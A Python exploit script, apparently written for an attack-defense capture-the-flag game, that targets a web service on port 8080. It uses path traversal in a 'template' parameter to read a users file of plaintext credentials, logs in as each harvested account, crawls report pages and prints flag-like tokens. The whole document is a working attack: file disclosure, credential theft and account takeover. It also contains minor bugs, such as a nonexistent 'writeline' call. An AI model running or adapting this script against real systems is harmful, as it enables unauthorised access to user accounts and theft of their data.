#!/usr/bin/python3
from  requests import *
import sys
import random, string
from bs4 import BeautifulSoup
import time
import re
def randomword(length=10):
   return ''.join(random.choice(string.ascii_letters) for i in range(length))
HOST = sys.argv[1]
s = session()
port = 8080
url = "http://"+HOST+":"+str(8080)
r = s.post(url+"/login",data={"username":randomword(), "password":randomword()})
r = s.get(url+"/projects?template=../users.txt")
login = {}
temp  = r.text.split("\n")
for  i in temp:
    t = i.split(":")
    try:
        login[t[0]] = t[1]
    except Exception:
        continue
file = open("users", "r")
users = file.read().split('\n')
users_to_write = []
for login, password in login.items():
    if '-' not in login or login in users:
        continue
    users_to_write.append(login)
    r = s.post(url+"/login", data={"username":login,"password":password})
    soup = BeautifulSoup(r.text, "html")
    links = soup.findAll("a")
    for link in links:
        if "reports/" in str(link):
            report = link["href"]
            response = s.get(url + report)
            soup = BeautifulSoup(response.text, "html")
            links = soup.findAll("a")
            for link in links:
                if "list/" in str(link):
                    report = link["href"]
                    response = s.get(url + report)
                    time.sleep(1)
                    soup = BeautifulSoup(response.text, "html")
                    links = soup.findAll("a")
                    for link in links:
                        if "report/" in str(link):
                            report = link["href"]
                            response = s.get(url + report)
                            compiled = re.compile("[A-Z0-9]{31}=")
                            print(compiled.findall(response.text), flush=True)
file.close()
file = open("users","a")
for i in users_to_write:
    file.writeline(i)